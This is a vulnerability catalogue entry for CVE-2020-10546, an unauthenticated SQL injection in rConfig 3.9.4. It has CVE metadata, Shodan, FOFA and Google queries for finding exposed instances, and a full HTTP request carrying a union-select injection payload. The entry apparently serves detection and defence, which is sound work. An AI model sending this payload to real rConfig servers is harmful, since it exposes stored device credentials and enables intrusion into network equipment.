---
layout: post
cve_id: CVE-2020-10546
title: rConfig 3.9.4 - SQL Injection
pcap: true
pcap_path: /pcaps/2020/CVE-2020-10546.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-10546.yaml
snort2_rule: N/A
snort3_rule: N/A
author: madrobot
severity: critical
impact: 'Successful exploitation of this vulnerability allows an attacker to execute
  arbitrary SQL queries, potentially leading to unauthorized access, data manipulation.

  '
remediation: 'Upgrade to the latest version of rConfig or apply the provided patch
  to fix the SQL Injection vulnerability.

  '
reference:
- https://github.com/theguly/exploits/blob/master/CVE-2020-10546.py
- https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
- https://nvd.nist.gov/vuln/detail/CVE-2020-10546
- https://github.com/theguly/exploits
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-10546
  cwe-id: CWE-89
  epss-score: 0.91387
  epss-percentile: 0.99638
  cpe: cpe:2.3:a:rconfig:rconfig:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: rconfig
  product: rconfig
  shodan-query: http.title:"rconfig"
  fofa-query: title="rconfig"
  google-query: intitle:"rconfig"
tags:
- cve2020
- cve
- rconfig
- sqli
- vkev
- vuln
---

## üîç Vulnerability Description
rConfig 3.9.4 and previous versions have unauthenticated compliancepolicies.inc.php SQL injection. Because nodes' passwords are stored in cleartext by default, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.

## üåê HTTP Request
```nohighlight
GET /compliancepolicies.inc.php?search=True&searchColumn=policyName&searchOption=contains&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL+--+ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

